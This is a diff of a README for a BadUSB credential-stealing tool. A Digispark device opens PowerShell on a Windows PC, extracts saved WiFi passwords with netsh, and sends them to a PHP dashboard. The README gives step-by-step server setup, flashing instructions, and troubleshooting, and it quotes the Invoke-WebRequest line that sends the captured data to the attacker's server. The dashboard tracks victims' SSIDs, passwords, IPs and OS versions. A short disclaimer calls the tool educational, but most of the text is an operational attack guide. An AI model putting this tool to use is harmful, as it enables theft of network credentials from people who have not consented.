@@ -1,106 +1,201 @@
-# Wifi Stealer Dashboard
+# WiFi Stealer Dashboard
 
-Educational/offensive‑security project that:
+A BadUSB payload that grabs WiFi credentials from Windows machines and displays them on a web dashboard. Built this for pentesting.
 
-- Steals Wi‑Fi SSID and password from a Windows machine using PowerShell run via BadUSB (Attiny85 / Digispark).  
-- Sends captured data to a PHP receiver (`wifi-recv.php`).  
-- Shows a live dashboard (`index.php`) on a Kali/Apache server.
+## What it does
+
+- Attiny85/Digispark acts as a keyboard when plugged into Windows
+- Runs PowerShell to extract saved WiFi passwords
+- Sends everything to a PHP server (your Kali box or Windows machine)
+- Nice dashboard to see all the captured creds
 
 ---
 
-## 1. Setup the PHP dashboard on Kali
+## Setting Up the Server
 
-Run these commands on **Kali Linux**:
+You can host the dashboard on either Kali or Windows. Pick whichever you're comfortable with.
+
+### On Kali Linux
 
 ```bash
-# 1. Install Apache + PHP
-sudo apt update
-sudo apt install -y apache2 php php-cli curl
+# Grab the repo
+cd ~
+git clone https://github.com/Zypher17/wifi-stealer.git
+cd wifi-stealer
 
-# 2. Enable Apache and start it
+# Install web server stuff
+sudo apt update
+sudo apt install apache2 php
+
+# Start Apache
 sudo systemctl enable apache2
 sudo systemctl start apache2
 
-# 3. Place the dashboard files in /var/www/html
-sudo cp ~/wifi-stealer-dashboard/index.php /var/www/html/
-sudo cp ~/wifi-stealer-dashboard/wifi-recv.php /var/www/html/
+# Check your IP - write this down, you'll need it later
+ip addr show | grep "inet " | grep -v 127.0.0.1
 
-# 4. Make log file writable by Apache
+# Copy files over
+sudo cp index.php /var/www/html/
+sudo cp wifi-recv.php /var/www/html/
+
+# Set up the log file
 sudo touch /var/www/html/wifi_creds.log
 sudo chown www-data:www-data /var/www/html/{index.php,wifi-recv.php,wifi_creds.log}
 sudo chmod 664 /var/www/html/wifi_creds.log
 ```
 
-Open the dashboard in browser:
-
-```text
-http://192.168.1.100/
+Make sure it's working:
+```bash
+curl -X POST http://localhost/wifi-recv.php -d "data=test"
+cat /var/www/html/wifi_creds.log
 ```
 
-(Replace `192.168.1.100` with your Kali's LAN IP if different.)
+If you see "test" in the output, you're good to go.
+
+Open `http://YOUR_IP/index.php` in a browser (replace YOUR_IP with the IP you found earlier).
 
 ---
 
-## 2. Setup the Attiny85 / Digispark BadUSB payload
+### On Windows (XAMPP)
 
-### A) Install DigiSpark support in Arduino IDE
+1. **Download XAMPP** from https://www.apachefriends.org - just get the basic version with Apache and PHP
 
-1. Open **Arduino IDE** on Windows/macOS.  
-2. Go to:  
-   - `File → Preferences`  
-   - In "Additional Boards Manager URLs" add:  
-     ```text
-     http://digistump.com/package_digistump_index.json
-     ```  
-3. Go to `Tools → Board → Boards Manager` and install:  
-   - `Digistump AVR Boards`  
-4. After install, select:  
-   - `Board: Digispark (Tiny85)`  
-   - `Clock: 16.5 MHz (Digispark)`  
+2. **Install it** - pretty straightforward, just keep clicking next
 
-### B) Load and flash the Attiny85 sketch
+3. **Start Apache** from the XAMPP control panel
 
-1. In Arduino IDE, open:  
-   - `File → Open...`  
-   - Navigate to your repo and open:  
-     ```text
-     ~/wifi-stealer-dashboard/payloads/wifi_stealer_digispark.ino
-     ```  
-2. Edit the PHP receiver URL if needed (only if you use a different IP):
-
-   Find this line in the sketch:
-
-   ```cpp
-   DigiKeyboard.print(
-     F("Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.1.8/wifi-recv.php' -Method POST -Body $b")
-   );
+4. **Get the project files:**
+   ```powershell
+   git clone https://github.com/Zypher17/wifi-stealer.git
+   # Or just download the ZIP from GitHub if you don't have git
    ```
 
-   Change `192.168.1.100` to your Kali's LAN IP, or to your VPS IP if you use one.
+5. **Copy to the web folder:**
+   ```powershell
+   Copy-Item index.php C:\xampp\htdocs\
+   Copy-Item wifi-recv.php C:\xampp\htdocs\
+   ```
 
-3. Plug in the Attiny85 / Digispark, then upload:
+6. **Create the log file** (run PowerShell as admin):
+   ```powershell
+   New-Item C:\xampp\htdocs\wifi_creds.log -ItemType File
+   icacls C:\xampp\htdocs\wifi_creds.log /grant Users:F
+   ```
 
-   - Click the **Upload** button.  
-   - When it says `Plug in device now...`, plug it in within 60 seconds.
+7. **Find your IP:**
+   ```powershell
+   ipconfig
+   ```
+   Look for the IPv4 address - that's what you need.
 
-After flashing, when you plug the Attiny85 into a Windows machine, it will:
+Test it works:
+```powershell
+Invoke-WebRequest -Uri 'http://localhost/wifi-recv.php' -Method POST -Body "data=test"
+Get-Content C:\xampp\htdocs\wifi_creds.log
+```
 
-- Open PowerShell,  
-- Run `netsh wlan` to extract Wi‑Fi profiles,  
-- Send captured SSID, password, IP, and OS to `wifi-recv.php`.  
+Visit `http://localhost/index.php` - should see the dashboard.
 
 ---
 
-## 3. Result
+## Programming the Digispark
 
-- Captured Wi‑Fi credentials are stored in:  
-  ```text
-  /var/www/html/wifi_creds.log
-  ```  
-- Open:  
-  ```text
-  http://192.168.1.100/
-  ```  
-  to view the dashboard, stats, and delete unwanted entries.
+### Getting Arduino IDE ready
 
-This project is designed for **local network / LAN labs**. Exposing the server to the internet requires careful handling of your public IP, port‑forwarding, or a VPS setup.
+1. Open Arduino IDE
+2. File → Preferences
+3. Paste this into "Additional Boards Manager URLs": http://digistump.com/package_digistump_index.json
+4. Tools → Board → Boards Manager
+5. Search for "Digistump AVR" and install it
+6. Select Board: "Digispark (Default - 16.5MHz)"
+
+### Uploading the payload
+
+1. Open `payloads/wifi_stealer_digispark.ino` from the repo
+
+2. **IMPORTANT:** Find this line and change the IP address:
+```cpp
+DigiKeyboard.print(
+  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.1.8/wifi-recv.php' -Method POST -Body $b")
+);
+```
+
+Change `192.168.1.8` to whatever IP your server is running on. That's the Kali or Windows machine from earlier.
+
+3. Click Upload
+
+4. Wait for it to say "Plug in device now..." then plug in your Digispark
+
+5. Should say "success" after a few seconds
+
+Now whenever you plug that Digispark into a Windows PC, it'll:
+- Pop open PowerShell
+- Grab all saved WiFi passwords
+- Send them to your server
+- Close everything and clean up
+
+Pretty fast - takes like 5-10 seconds depending on how many networks they have saved.
+
+---
+
+## Viewing the Results
+
+Everything gets saved to `wifi_creds.log` and shows up on the dashboard at:
+- `http://YOUR_SERVER_IP/index.php`
+
+The dashboard shows:
+- How many machines you've hit
+- All the SSIDs and passwords
+- IP addresses of the victims
+- Their OS version
+- You can delete entries too if you want
+
+---
+
+## Heads Up
+
+This is **strictly for educational purposes** and authorized pentesting only. Don't be that guy who uses this on random people - that's super illegal and just generally a dick move.
+
+If you're running this in a lab:
+- Keep it on your local network
+- Don't expose it to the internet without proper security
+- Get permission before testing on any device you don't own
+
+---
+
+## Troubleshooting
+
+**Dashboard won't load:**
+- Make sure Apache/XAMPP is actually running
+- Check if you can access `http://localhost` - should show the Apache default page
+- Look at the log file permissions, Apache needs to write to it
+
+**Not getting any data:**
+- Double-check the IP in the Arduino code matches your server
+- Firewall might be blocking it - try disabling temporarily to test
+- Make sure the log file exists and is writable
+
+**Digispark upload fails:**
+- Windows might need drivers - Google "Digispark drivers Windows"
+- Try a different USB port
+- Make sure you plug it in AFTER clicking upload, not before
+- Some USB 3.0 ports are weird with Digispark, try USB 2.0
+
+**Getting garbage data:**
+- Target machine might not have admin rights
+- Windows Defender could be blocking PowerShell execution
+- Some corporate machines have strict policies that prevent this
+
+---
+
+## Notes
+
+Built this to learn more about BadUSB attacks and how easy it is to grab WiFi creds from Windows. Pretty scary how quick it is honestly.
+
+The PHP code is super simple - literally just writes POST data to a file. Could definitely make it fancier with a database and stuff, but keeping it simple for now.
+
+Feel free to fork and improve it. Would be cool to add:
+- Encryption for the data in transit
+- Better logging with timestamps
+- Export to CSV
+- Maybe a filter to ignore duplicates
